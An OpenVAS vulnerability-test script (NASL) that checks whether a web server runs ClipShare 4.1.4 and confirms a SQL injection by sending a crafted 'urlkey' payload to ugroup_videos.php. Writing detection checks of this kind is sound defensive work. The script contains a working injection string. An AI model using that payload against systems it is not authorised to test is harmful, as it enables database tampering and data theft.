###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_clipshare_mult_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# ClipShare Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to gain access to the
  password information and inject or manipulate SQL queries in the back-end
  database, allowing for the manipulation or disclosure of arbitrary data.
  Impact Level: Application";

tag_affected = "ClipShare Version 4.1.4";
tag_insight = "Multiple flaws are due to,
  - storing sensitive information in the /siteadmin/login.php file as plaintext
  - Input passed via the 'urlkey' parameter to ugroup_videos.php script is
    not properly sanitised before being returned to the user.";
tag_solution = "No solution or patch is available as of 18th March, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.clip-share.com";
tag_summary = "This host is installed with ClipShare and is prone to Multiple
  vulnerabilities.";

if(description)
{
  script_id(803440);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-03-18 14:25:41 +0530 (Mon, 18 Mar 2013)");
  script_name("ClipShare Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.com/91289");
  script_xref(name : "URL" , value : "http://www.osvdb.com/91288");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24790");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120792/");
  script_xref(name : "URL" , value : "http://www.exploitsdownload.com/exploit/na/clipshare-414-sql-injection-plaintext-password");

  script_description(desc);
  script_summary("Check if ClipShare is vulnerable sql injection vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
sndReq = "";
rcvRes = "";
postData = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("", "/clipshare", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get(item:string(dir,"/index.php"),  port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application
  if(">ClipShare<" >< res)
  {
    ## Construct the attack request
    url = dir + "/ugroup_videos.php?urlkey=1' or (select if(5=5,0,3))-- 3='3";

    if(http_vuln_check(port:port, url:url, check_header:TRUE,
           pattern:"HTTP/1.1 200 OK", extra_check:">ClipShare<"))
    {
      security_hole(port);
      exit(0);
    }
  }
}
